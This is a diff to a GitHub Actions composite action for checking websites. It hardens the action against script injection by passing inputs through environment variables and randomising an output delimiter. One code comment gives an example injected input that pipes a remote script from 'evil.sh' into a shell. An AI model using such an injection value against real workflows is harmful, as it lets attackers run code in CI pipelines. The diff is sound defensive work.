@@ -35,20 +35,32 @@ runs:
   steps:
     - id: check
       shell: bash
+      # Inputs are passed through env, never interpolated into the script body:
+      # `${{ }}` is expanded by the runner before bash parses the line, so a url of
+      # `"; curl evil.sh | sh; "` would run as shell. Keep every input in env.
+      env:
+        ACTION_PATH: ${{ github.action_path }}
+        INPUT_URL: ${{ inputs.url }}
+        INPUT_LIMIT: ${{ inputs.limit }}
+        INPUT_FAIL_ON_ISSUES: ${{ inputs.fail-on-issues }}
+        INPUT_INDEXNOW_KEY: ${{ inputs.indexnow-key }}
       run: |
         set -o pipefail
         REPORT_FILE="$(mktemp)"
-        # ${{ github.action_path }} is this action's checkout — run the pinned code,
+        # $ACTION_PATH is this action's checkout — run the pinned code,
         # not whatever npx would resolve today.
-        node "${{ github.action_path }}/index.mjs" check "${{ inputs.url }}" \
-          --limit "${{ inputs.limit }}" 2>&1 | tee "$REPORT_FILE" || true
+        node "$ACTION_PATH/index.mjs" check "$INPUT_URL" \
+          --limit "$INPUT_LIMIT" 2>&1 | tee "$REPORT_FILE" || true
         ISSUES=$(grep -oE '^[[:space:]]+([0-9]+) issue' "$REPORT_FILE" | grep -oE '[0-9]+' | head -1)
         ISSUES="${ISSUES:-0}"
         echo "issues=$ISSUES" >>"$GITHUB_OUTPUT"
+        # Random delimiter: the report echoes text from the target site, so a fixed one
+        # could be closed early by a page whose title contains it.
+        DELIM="SITEPREFLIGHT_EOF_${RANDOM}${RANDOM}${RANDOM}"
         {
-          echo 'report<<SITEPREFLIGHT_EOF'
+          echo "report<<$DELIM"
           cat "$REPORT_FILE"
-          echo 'SITEPREFLIGHT_EOF'
+          echo "$DELIM"
         } >>"$GITHUB_OUTPUT"
         {
           echo '## Site preflight'
@@ -58,12 +70,12 @@ runs:
           echo '```'
         } >>"$GITHUB_STEP_SUMMARY"
 
-        if [ -n "${{ inputs.indexnow-key }}" ] && [ "$ISSUES" = "0" ]; then
-          node "${{ github.action_path }}/index.mjs" submit "${{ inputs.url }}" \
-            --key "${{ inputs.indexnow-key }}" || true
+        if [ -n "$INPUT_INDEXNOW_KEY" ] && [ "$ISSUES" = "0" ]; then
+          node "$ACTION_PATH/index.mjs" submit "$INPUT_URL" \
+            --key "$INPUT_INDEXNOW_KEY" || true
         fi
 
-        if [ "${{ inputs.fail-on-issues }}" = "true" ] && [ "$ISSUES" != "0" ]; then
+        if [ "$INPUT_FAIL_ON_ISSUES" = "true" ] && [ "$ISSUES" != "0" ]; then
           echo "::error::site preflight found $ISSUES issue(s) — see the job summary"
           exit 1
         fi
